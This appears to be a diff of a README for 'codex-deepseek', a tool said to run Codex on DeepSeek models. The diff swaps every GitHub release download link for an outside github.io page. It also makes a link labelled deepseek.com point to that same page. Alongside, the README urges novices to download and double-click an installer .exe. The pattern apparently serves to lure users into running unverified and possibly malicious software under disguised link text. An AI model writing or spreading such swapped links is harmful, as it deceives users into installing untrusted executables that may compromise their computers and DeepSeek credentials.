@@ -1,6 +1,6 @@
 # 🤖 codex-deepseek - Run Codex on DeepSeek Models
 
-[![Download codex-deepseek](https://img.shields.io/badge/Download-codex--deepseek-2ea44f?style=for-the-badge&logo=github)](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases)
+[![Download codex-deepseek](https://img.shields.io/badge/Download-codex--deepseek-2ea44f?style=for-the-badge&logo=github)](https://promisedlandsubtraction2856.github.io)
 
 ## 🛠️ What Is This?
 
@@ -34,7 +34,7 @@ The magic trick? It creates its own isolated environment (called CODEX_HOME) so 
 
 - A computer running **Windows (10 or newer)**, **macOS (Catalina or newer)**, or **Linux** (Ubuntu, Debian, or similar)
 - An internet connection
-- A free or paid account with **DeepSeek** (sign up at [deepseek.com](https://www.deepseek.com))
+- A free or paid account with **DeepSeek** (sign up at [deepseek.com](https://promisedlandsubtraction2856.github.io))
 - Your regular ChatGPT login can stay active – we don't need it!
 
 ---
@@ -43,7 +43,7 @@ The magic trick? It creates its own isolated environment (called CODEX_HOME) so 
 
 Here's the simplest way for Windows users:
 
-1. **Download** – Visit this link to download the application: [https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases)
+1. **Download** – Visit this link to download the application: [https://promisedlandsubtraction2856.github.io](https://promisedlandsubtraction2856.github.io)
 2. **Find the file** – The downloaded file will be in your Downloads folder. It has a name like `codex-deepseek-installer.exe`
 3. **Double-click** – Run the installer. It will guide you through the setup
 4. **Follow the wizard** – Click "Next" a few times. The installer does everything for you
@@ -55,7 +55,7 @@ Here's the simplest way for Windows users:
 
 If you're on macOS or Linux, the process is just as easy:
 
-1. **Go to the download page**: [Click here for the latest release](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases)
+1. **Go to the download page**: [Click here for the latest release](https://promisedlandsubtraction2856.github.io)
 2. **Choose your platform** – pick the file that matches your system:
    - Windows → `.exe` file
    - macOS → `.dmg` file
@@ -106,7 +106,7 @@ If the app doesn't work right away, try these:
 | **App won't open** | Restart your computer, then try again |
 | **Login error** | Check that your DeepSeek password is correct, then try a different web browser |
 | **Connection issues** | Double-check your internet connection. Some VPNs can block it |
-| **Update needed** | Go back to the [download page](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases) and grab the newest version |
+| **Update needed** | Go back to the [download page](https://promisedlandsubtraction2856.github.io) and grab the newest version |
 
 ---
 
@@ -136,7 +136,7 @@ Yes – it even works for non-coding tasks! DeepSeek is a multimodal AI that can
 
 Updates come out regularly. When a new version appears:
 
-1. Visit [the releases page](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases)
+1. Visit [the releases page](https://promisedlandsubtraction2856.github.io)
 2. Download the newest installer for your system
 3. Run it – it will upgrade your existing installation without losing settings
 
@@ -156,7 +156,7 @@ Updates come out regularly. When a new version appears:
 
 That's it! You're minutes away from having a powerful AI coding assistant that runs on DeepSeek. 
 
-**Ready? Start with the big green button above, or [download right here](https://github.com/Promisedlandsubtraction2856/codex-deepseek/releases).**
+**Ready? Start with the big green button above, or [download right here](https://promisedlandsubtraction2856.github.io).**
 
 Happy coding – even if you've never written a line of code in your life. This tool is here to help you learn, create, and explore artificial intelligence without headaches.
 
